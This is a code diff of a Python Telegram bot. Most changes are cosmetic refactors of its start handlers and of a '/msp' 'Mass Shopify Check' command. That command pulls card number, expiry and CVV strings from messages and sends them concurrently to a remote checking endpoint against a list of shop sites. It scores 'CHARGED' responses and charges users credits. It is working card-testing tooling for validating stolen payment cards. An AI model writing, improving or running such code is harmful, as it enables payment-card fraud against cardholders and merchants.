@@ -441,38 +441,26 @@ async def build_start_message(user, context) -> tuple[str, InlineKeyboardMarkup]
 # Command and Callback Handlers
 # --------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Handles the /start command. It sends a single message containing
-    the welcome image, profile card, and inline keyboard.
-    """
     user = update.effective_user
     logger.info(f"/start by {user.id} (@{user.username})")
-    
-    # Get the text and keyboard from the helper function
     text, keyboard = await build_start_message(user, context)
-    
-    # Get the message object to reply to
     msg = update.message or update.effective_message
-    
-    # Send a photo with a caption. The caption is where the text and buttons appear.
+
     await msg.reply_photo(
         photo="https://i.postimg.cc/hjNQNyP1/1ea64ac8-ad6a-42f2-89b1-3de4a0d8e447.png",
         caption=text,
-        parse_mode=ParseMode.MARKDOWN_V2,
-        reply_markup=keyboard,
+        parse_mode=ParseMode.HTML,
+        reply_markup=keyboard
     )
 
 async def back_to_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Callback handler to return to the main start menu by editing the message.
-    """
     q = update.callback_query
     await q.answer()
     text, keyboard = await build_start_message(q.from_user, context)
     await q.edit_message_caption(
-        text,
-        parse_mode=ParseMode.MARKDOWN_V2,
-        reply_markup=keyboard,
+        caption=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=keyboard
     )
 
 
@@ -3245,22 +3233,24 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+# ===== Shopify check request =====
 import asyncio
 import httpx
 import time
-import re
 from html import escape
 from telegram import Update
 from telegram.ext import ContextTypes
+
 from db import get_user, update_user
 
-# Cooldown tracking
+# In-memory cooldowns
 last_msp_usage = {}
 
-# Regex for card detection
+# Regex to extract cards
+import re
 CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 
-# Consume user credit
+# Consume credit
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
@@ -3270,14 +3260,15 @@ async def consume_credit(user_id: int) -> bool:
 
 # ===== Shopify check request =====
 async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str):
-    try:
-        # Ensure HTTPS
-        if not site.startswith("http://") and not site.startswith("https://"):
-            site = "https://" + site
+    # Ensure HTTPS
+    if not site.startswith("http://") and not site.startswith("https://"):
+        site = "https://" + site
 
-        url = f"{base_url}?site={site}&cc={card}"
+    url = f"{base_url}?site={site}&cc={card}"
+    try:
         r = await session.get(url, timeout=20)
         data = r.json()
+        # Return structured response
         return (
             data.get("Response", "Unknown"),
             data.get("Status", "false"),
@@ -3285,20 +3276,19 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
             data.get("Gateway", "N/A"),
         )
     except Exception as e:
-        return f"Error: {e}", "false", "0", "N/A"
-
+        # Return actual exception as response
+        return f"Error: {str(e)}", "false", "0", "N/A"
 
 # ===== Background runner =====
 async def run_msp(update: Update, cards, base_url, sites, msg):
-    approved, declined, errors = 0, 0, 0
-    checked = 0
+    approved = declined = errors = checked = 0
     site_price = None
     gateway_used = "Self Shopify"
     results = []
-    sem = asyncio.Semaphore(4)
+    sem = asyncio.Semaphore(4)  # Adjust concurrency here
     lock = asyncio.Lock()
 
-    # Priority map for best response selection
+    # Priority map
     PRIORITY = {
         "CHARGED": 4,
         "THANK YOU": 4,
@@ -3325,7 +3315,6 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
             resp_str = str(resp).strip()
             resp_upper = resp_str.upper()
 
-            # set site price only once
             nonlocal site_price, gateway_used
             if site_price is None:
                 try:
@@ -3335,7 +3324,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
             if gateway and gateway != "N/A":
                 gateway_used = gateway
 
-            # score the response
+            # Determine score
             score = 0
             for key, val in PRIORITY.items():
                 if key in resp_upper:
@@ -3345,8 +3334,8 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
 
         async def worker(card):
             nonlocal approved, declined, errors, checked, results
-
             async with sem:
+                # Check card on all sites
                 tasks = [check_one(card, site) for site in sites]
                 responses = await asyncio.gather(*tasks)
 
@@ -3378,7 +3367,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                 result_line = f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{display_resp}</i>"
                 results.append(result_line)
 
-                # Update summary (last 20 results)
+                # Update summary
                 async with lock:
                     summary_text = (
                         "<pre><code>"
@@ -3402,9 +3391,8 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
                         pass
                     await asyncio.sleep(0.2)
 
-        # Run all cards in parallel
+        # Run all cards
         await asyncio.gather(*(worker(card) for card in cards))
-
 
 # ===== /msp command =====
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3442,12 +3430,10 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
     sites = user_data.get("custom_urls", [])
-
     if not sites:
         return await update.message.reply_text("❌ No sites found in your account.")
 
     msg = await update.message.reply_text("💳 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤…")
-
     asyncio.create_task(run_msp(update, cards, base_url, sites, msg))
 
 
